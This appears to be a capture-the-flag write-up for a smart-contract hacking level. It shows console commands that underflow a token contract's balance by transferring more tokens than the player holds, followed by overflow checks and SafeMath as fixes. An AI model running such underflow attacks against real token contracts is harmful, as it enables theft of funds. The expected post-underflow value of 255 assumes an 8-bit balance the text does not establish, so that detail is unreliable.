### Task

>The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

### Observations

This contract is susceptible to overflow and underflow attacks.

There is no condition/safemath functions/check before performing mathematical calculations.

Therefore to expoit this contract, I need to transfer more tokens than I have.

### Steps

Find out how many tokens I have. 
```await contract.balanceOf(player)```

I have 20. So transfer 21 or more tokens to any address.
```await contract.transfer('0x69F1977310B0c02248D631671AF7211E2e175937', 21)```

Check balance again as the underflow should set my balance to 255.
```await contract.balanceOf(player)```

Easy to avoid over/underflow exploits by using a condition such as:
```
if(a + c > a) {
  a = a + c;
}
```
Or OpenZeppelin SafeMath lib:
```
a = a.add(c);
```
